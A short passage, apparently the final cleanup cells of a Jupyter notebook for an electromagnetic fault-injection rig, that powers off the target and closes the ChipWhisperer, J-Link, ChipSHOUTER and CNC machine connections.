scope.io.target_pwr = False       # Power off target via CW +3.3V

In [ ]:
try:
    jlink.close()     # Close Segger J-Link
except NameError:
    pass

scope.dis()       # Close ChipWhisperer
cs.disconnect()   # Close ChipSHOUTER
cnc.close         # Close CNC Milling Machine

print("Done!")